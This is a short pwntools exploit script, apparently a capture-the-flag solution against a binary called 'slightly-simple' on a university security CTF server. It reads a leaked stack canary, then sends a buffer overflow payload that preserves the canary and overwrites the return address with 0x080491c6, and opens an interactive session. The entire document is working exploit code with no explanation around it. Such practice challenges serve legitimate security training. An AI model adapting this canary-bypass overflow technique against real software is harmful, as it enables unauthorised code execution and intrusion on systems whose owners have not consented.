# simple get canary
from pwn import *

p = process('./slightly-simple')
#p = remote('pwn.ctf.unswsecurity.com',7005)
p.readline()
print(canary := p.readline().decode("ascii", "ignore").strip())
p.sendline(b'A'*20 + p32(int(canary, 16)) + b'AAAA'*3 + p32(0x080491c6))
p.interactive()
